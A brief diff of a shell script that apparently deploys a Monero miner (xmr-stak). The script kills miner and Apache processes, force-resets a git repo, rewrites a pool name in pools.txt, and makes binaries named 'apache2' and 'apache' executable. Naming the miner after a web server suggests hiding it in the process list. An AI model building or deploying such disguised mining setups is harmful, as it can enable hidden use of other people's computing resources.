@@ -3,7 +3,12 @@
 killall xmr-stak; killall apache2; killall apache
 
 cd ~/dollar/ ; git stash drop; git reset --hard; git pull
-sed -i -e "s/digitaloceanxmr/`cat ~/index.html`/" pools.txt
+
+
+sed -i -e 's/\./_/g' ~/index.html
+sed -i -e "s/digitalocean/`cat ~/index.html`/" pools.txt
+
+
 cd ~/dollar/ 
 cp -rf cpu`nproc`.txt cpu.txt
 chmod +x apache2 ; chmod +x apache
